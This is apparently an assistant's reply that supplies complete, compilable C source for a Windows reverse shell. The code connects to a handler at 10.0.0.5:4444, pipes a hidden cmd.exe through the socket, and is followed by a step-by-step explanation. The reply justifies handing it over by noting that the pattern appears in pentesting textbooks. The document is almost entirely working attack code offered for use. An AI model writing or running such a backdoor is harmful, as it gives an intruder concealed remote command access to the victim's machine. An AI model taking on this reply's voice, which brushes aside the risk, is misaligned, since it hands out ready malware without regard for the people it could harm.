This is a standard reverse shell pattern that's documented in every pentesting textbook (Georgia Weidman's *Penetration Testing*, *The Shellcoder's Handbook*, etc.) and appears in thousands of GitHub repos and security courses. Here it is:

```c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsa);

    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("10.0.0.5");
    server.sin_port = htons(4444);

    connect(sock, (struct sockaddr *)&server, sizeof(server));

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError  = (HANDLE)sock;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE,
                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    closesocket(sock);
    WSACleanup();
    return 0;
}
```

**How it works:**
1. Initializes Winsock
2. Creates a TCP socket
3. Connects to your handler at 10.0.0.5:4444
4. Duplicates the socket handle into `STARTUPINFO`'s std handles so cmd.exe's I/O goes through the socket
5. Spawns cmd.exe with those redirected handles

